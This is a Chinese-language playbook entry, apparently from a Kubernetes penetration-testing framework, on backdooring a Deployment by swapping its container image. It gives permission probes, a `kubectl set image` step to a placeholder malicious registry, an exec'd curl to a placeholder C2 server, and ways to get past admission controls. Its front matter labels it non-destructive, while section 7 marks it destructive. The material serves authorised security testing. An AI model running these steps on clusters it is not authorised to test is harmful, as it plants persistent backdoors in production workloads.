---
source: manual
confidence: high
platforms: [k8s]
required_tools: []
execution_contexts: [L0, L1, L2]
max_verification_level: L2
destructive: false
mapped_attack_surfaces: [AS-7.6]
mapped_compliance_families: [Deployment, 镜像管理]
---

# deployment-image-override — Deployment 镜像替换后门

攻击者持有 `deployments` 的 `update` 权限或镜像来源不受控，通过 `kubectl set image` 将 Deployment 的容器镜像替换为恶意镜像，使恶意代码在后续滚动更新中替换原有工作负载，受害者无感知地运行后门容器。

---

## 1. 前置条件

- 当前身份被授予 `deployments` 的 `update` 权限
- 集群未启用镜像签名验证（无 Connaisseur/Kyverno 签名校验）
- 镜像 registry 可被攻击者写入或使用公共不可信 registry

检查命令：
```bash
# [L0] 探测：检查 Deployment 更新权限
kubectl auth can-i update deployments --all-namespaces
# 期望输出: yes

# [L0] 探测：列出 Deployment 镜像
kubectl get deployment -A -o jsonpath='{range .items[*]}{@.metadata.namespace}{"/"}{@.metadata.name}{" image="}{@.spec.template.spec.containers[*].image}{" policy="}{@.spec.template.spec.containers[*].imagePullPolicy}{"\n"}{end}' | head
# 期望输出: 镜像 tag 与 imagePullPolicy（若 Always → 替换后强制重新拉取）
```

## 2. 探测命令

```bash
# [L0] 探测：确认 deployment 更新权限
kubectl auth can-i patch deployments -n <ns>
# 期望输出: yes

# [L0] 探测：识别可替换的目标 Deployment
kubectl get deployment -n <ns> -o wide
# 期望输出: 命名空间内所有 Deployment

# [L0] 探测：检查镜像签名验证机制是否存在
kubectl get validatingwebhookconfiguration -A | grep -iE "image|policy|connaisseur"
# 期望输出: 无输出 → 无镜像签名验证
```

## 3. 攻击验证

```bash
# [L2] 攻击验证：替换目标 Deployment 镜像为恶意镜像
kubectl set image deployment/<name> <container>=<malicious-registry>/<image>:latest -n <ns>
# 期望输出: deployment.apps/<name> image updated

# [L2] 攻击验证：确认滚动更新完成
kubectl rollout status deployment/<name> -n <ns>
# 期望输出: deployment "<name>" successfully rolled out

# [L2] 攻击验证：在新 Pod 中执行后门命令
kubectl exec -n <ns> <new-pod> -- curl -s http://<c2-server>/
# 期望输出: C2 响应（证明恶意镜像已运行）
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录原镜像
kubectl get deployment <name> -n <ns> -o jsonpath='{.spec.template.spec.containers[*].image}'
# 期望输出: <original-image>:<tag>

# [L0] 攻击后环境对比：记录新镜像
kubectl get deployment <name> -n <ns> -o jsonpath='{.spec.template.spec.containers[*].image}'
# 期望输出: <malicious-image>:latest → 证明镜像被替换

# [L1] 攻击前/后对比：Pod 镜像实际运行内容
kubectl exec -n <ns> <pod> -- cat /proc/1/cmdline 2>/dev/null
# 期望输出: 攻击前为原进程；攻击后为后门进程 → 证明运行内容变更
```

差分结论：攻击前 Deployment 镜像为 `<original-image>`，攻击后变更为 `<malicious-image>` 并通过滚动更新运行后门进程，证明镜像替换后门成立。

## 5. 绕过策略

```bash
# [L0] 检查 RBAC 是否限制 deployment 更新
kubectl auth can-i update deployments -n <ns>
# 若 no → 无法直接替换

# 绕过方式：
# - [L2] 若镜像签名验证启用但 registry 不校验，使用同 tag 不同 digest 的恶意镜像
# - [L2] 若 update 受限但 patch 允许，通过 patch 替换 image 字段
# - [L2] 若签名校验阻断，先攻击 admission webhook 配置放行
# - [L1] 若 imagePullPolicy=IfNotPresent，使用已缓存于节点的同名 tag（旧 digest）覆盖
```

## 6. 证伪条件

```bash
# [L0] 无 deployment 更新权限
kubectl auth can-i update deployments -n <ns>
# 输出: no → 证伪

# [L2] 镜像替换被准入控制器拒绝
kubectl set image deployment/<name> <c>=<mal-image> 2>&1
# 输出: denied by admission webhook → 证伪

# [L2] 滚动更新因镜像签名不对而失败
kubectl rollout status deployment/<name> 2>&1
# 输出: ImagePullBackOff 或签名校验失败 → 证伪
```

## 7. 审批级别

- **L2** 攻击验证（替换生产 Deployment 镜像）→ **Level 4**（修改生产工作负载，需人工确认）
- **L1** 探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：是（替换生产工作负载）
- 最高验证层级：L2

## 8. MITRE ATT&CK

- **Tactic**: Persistence / Execution
- **Technique ID**: T1525
- **Technique Name**: Implant Internal Image
- **描述**: 攻击者持有 `deployments` 的 `update` 权限，通过 `kubectl set image` 将 Deployment 容器镜像替换为恶意镜像（无镜像签名验证时尤为高危），使后门随滚动更新替代原工作负载实现持久化执行。